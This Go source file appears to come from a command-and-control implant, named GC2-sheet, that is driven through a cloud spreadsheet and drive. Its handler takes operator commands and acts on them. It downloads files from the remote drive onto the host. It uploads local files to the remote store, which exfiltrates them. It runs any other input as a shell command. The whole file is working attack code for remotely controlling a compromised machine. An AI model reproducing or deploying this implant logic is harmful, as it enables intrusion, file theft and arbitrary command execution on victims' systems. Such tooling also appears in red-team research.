package C2

import (
	"GC2-sheet/internal/utils"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func localCommandExecution(fs FileSystem, lastCommand *Command) {

	commandToExecute := lastCommand.Input

	// Checking for download command
	if strings.HasPrefix(commandToExecute, "download") {
		slittedCommand := strings.Split(commandToExecute, ";")
		if len(slittedCommand) == 3 {
			fileDriveId := slittedCommand[1]
			downloadPath := slittedCommand[2]
			utils.LogDebug("New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
			fileContent, downloadErr := fs.pullFile(fileDriveId)
			if downloadErr != nil {
				lastCommand.Output = downloadErr.Error()
				utils.LogDebug(downloadErr.Error())
				return
			} else {
				lastCommand.Output = "File Downloaded"
			}
			safeFiledErr := saveFile(downloadPath, fileContent)
			if safeFiledErr != nil {
				lastCommand.Output = safeFiledErr.Error()
				utils.LogDebug(safeFiledErr.Error())
				return
			} else {
				lastCommand.Output = "File Downloaded"
			}
			return
		}
	}

	// Checking for upload command
	if strings.HasPrefix(commandToExecute, "upload") {
		slittedCommand := strings.Split(commandToExecute, ";")
		if len(slittedCommand) == 2 {
			uploadFilePath := slittedCommand[1]
			utils.LogDebug("New upload command: file path: " + uploadFilePath)
			fileName := filepath.Base(uploadFilePath)
			file, fileOpenErr := os.Open(uploadFilePath)
			if fileOpenErr != nil {
				lastCommand.Output = fileOpenErr.Error()
				utils.LogDebug(fileOpenErr.Error())
				return
			}
			defer file.Close()
			uploadErr := fs.pushFile(fileName, file)

			if uploadErr != nil {
				lastCommand.Output = uploadErr.Error()
				utils.LogDebug(uploadErr.Error())
				return
			}

			lastCommand.Output = fmt.Sprintf("File Uploaded")

			return
		}
	}

	// Checking for exit command
	if commandToExecute == "exit" {
		Exit()
	}

	// Execute the command
	lastCommand.Output = executeCommand(commandToExecute)

	utils.LogDebug("Execution")
}
